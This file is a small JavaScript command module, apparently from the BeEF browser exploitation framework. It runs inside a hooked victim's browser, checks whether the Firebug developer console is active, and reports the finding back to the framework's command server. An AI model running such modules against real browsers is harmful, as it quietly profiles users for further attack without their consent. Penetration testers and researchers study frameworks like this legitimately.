//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {
	var result = "Not in use or not installed";
	if (window.console && (window.console.firebug || window.console.exception)) result = "Enabled and in use!";
	server.net.send("<%= @command_url %>", <%= @command_id %>, "firebug="+result);
});

